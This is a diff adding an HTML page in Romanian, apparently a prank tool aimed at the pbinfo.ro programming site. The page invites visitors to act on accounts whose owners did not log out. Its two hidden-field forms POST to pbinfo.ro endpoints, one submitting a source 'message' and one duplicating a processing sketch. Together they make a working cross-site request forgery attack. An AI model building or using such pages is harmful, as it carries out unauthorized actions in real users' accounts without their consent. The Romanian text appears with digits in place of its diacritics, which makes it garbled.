@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<link href="https://fonts.googleapis.com/css?family=Sarabun:400,700" rel="stylesheet">
+		<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+		<link rel="stylesheet" href="style.css">
+		<title>Nu stii sa dai logout? Te ajutam noi. &mdash; 🤖 PeBotINFO</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0">
+		<meta name="description" content="Same old PBInfo, fresh new design">
+		<meta name="author" content="🤖🤖🤖">
+		<meta property="og:title" content="🤖 PeBotINFO &mdash; PbInfo cu o alta interfata!">
+		<meta property="og:site_name" content="🤖 PeBotINFO">
+		<meta property="og:type" content="website">
+		<meta property="og:description" content="Same old PBInfo, fresh new design">
+		<script src="https://code.jquery.com/jquery-1.12.4.js"></script>
+		<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
+		<script src="script.js"></script>
+		<script>
+			document.addEventListener("DOMContentLoaded", function () {
+				document.getElementById('send1').addEventListener("click", function () {
+					//document.getElementById('send').disabled = true;
+				});
+
+				$('#form1').submit(function () {
+					//return false;
+				});
+			});
+		</script>
+	</head>
+	<body>
+		<h1>🤖 Cineva s1i-a la1sat contul de PBInfo vulnerabil?</h1>
+		<p class="selection">Atent1ie: Completarea urma1toarelor date reprezinta1 implicit faptul ca1 ai acordul det1ina1torului contului s1i ca1 ra1spunzi de consecint1ele de pe urma completa1rii. With that being said, iata1 ca2teva solut1ii interesante:</p>
+		<p>1. Lasa1-i un mesaj dra1gut1, suntem siguri ca1 o sa1 se bucure s1i ca1 <span class="selection">o sa1 se i1nvet1e minte</span> 😊</p>
+		<form action="https://www.pbinfo.ro/ajx-module/php-solutie-incarcare.php" method="POST" id="form1">
+			<input type="hidden" name="id" value="2">
+			<input type="hidden" name="limbaj_de_programare" value="cpp">
+			<input type="hidden" name="pagina" value="probleme">
+			<textarea maxlength="200" id="mesaj" name="sursa" placeholder="Scrie un mesaj :)"></textarea><br>
+			<input type="submit" value="Trimite" id="send1" style="cursor: pointer;">
+		</form>
+		<p>2. Posteaza1 un chart de IQ i1n processing (<a href="https://www.pbinfo.ro/?pagina=processing&id=3118" target="_blank">preview</a>):</p>
+		<form action="https://www.pbinfo.ro/php/processing-duplicare.php" method="POST" id="form2">
+			<input type="hidden" name="id" value="3118">
+			<input type="hidden" name="denumire_nou" value="hmm...? - copie">
+			<input type="hidden" name="pagina" value="processing">
+			<input type="submit" value="Posteaza1" id="send2" style="cursor: pointer;">
+		</form>
+	</body>
+</html>
